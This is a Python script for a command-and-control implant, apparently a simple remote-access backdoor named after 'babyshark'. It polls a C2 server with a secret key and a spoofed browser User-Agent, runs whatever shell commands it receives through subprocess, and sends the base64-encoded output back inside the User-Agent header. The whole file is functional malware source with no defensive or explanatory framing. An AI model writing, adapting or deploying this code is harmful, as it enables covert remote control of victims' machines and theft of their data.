import base64
import requests
import shlex
import subprocess
import time
from bs4 import BeautifulSoup

# Variables
running = True
secretkey = "b4bysh4rk"
useragent = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
c2server = f"http://babyshark-c2:420/momyshark?key={secretkey}"
input = ''
output = ''

def get_command():
    
    print("Contacting C2 for tasks")
    try:
        r = requests.get(c2server, headers={"User-Agent": useragent}, timeout=5)
    except requests.exceptions.ConnectionError:
        print("Couldn't reach C2. Not available yet.")
        return None

    soup = BeautifulSoup(r.content, features="html.parser")
    tasks = [(task.text.split("#")[0].strip(), task.text.split("#")[-1].strip()) for task in soup.find_all("span")]

    if len(tasks) >= 1:
        print("Found a task! ", tasks[0])
        return tasks[0]
    return None


def push_result(result):
    r = requests.get(c2server, headers={"User-Agent": result})


while running is True:
    result = ""
    print("Sleeping for 10")
    time.sleep(10)
    task = get_command()
    if task is not None:
        command, _id = task
        if command == "exit":
            running = False

        print(command)
        output = ''
        try:
            p = subprocess.Popen(shlex.split(command), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = p.communicate()
        except:
            output = err
        time.sleep(2)  # Wait 2 seconds for command to execute
        outputb64 = base64.b64encode(output).decode()
        if outputb64 is not None:
            result = f"{useragent} | {outputb64} | {_id}"
            push_result(result)


